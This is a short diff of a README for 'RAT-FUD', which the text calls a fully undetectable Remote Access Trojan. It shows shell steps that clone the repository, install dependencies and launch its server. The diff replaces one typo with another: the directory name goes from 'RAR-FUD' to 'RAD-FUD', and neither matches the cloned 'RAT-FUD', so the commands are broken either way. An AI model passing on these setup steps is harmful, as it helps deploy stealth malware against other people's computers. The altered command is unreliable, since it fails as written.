@@ -17,7 +17,7 @@ RAT-FUD stands for Remote Access Trojan-Fully Undetectable or Remote Administrat
 
 ```shell
 $ git clone https://github.com/kyuurazz/RAT-FUD.git
-$ cd RAR-FUD
+$ cd RAD-FUD
 $ pip install -r requirement.txt
 $ python3 server.py
 ```
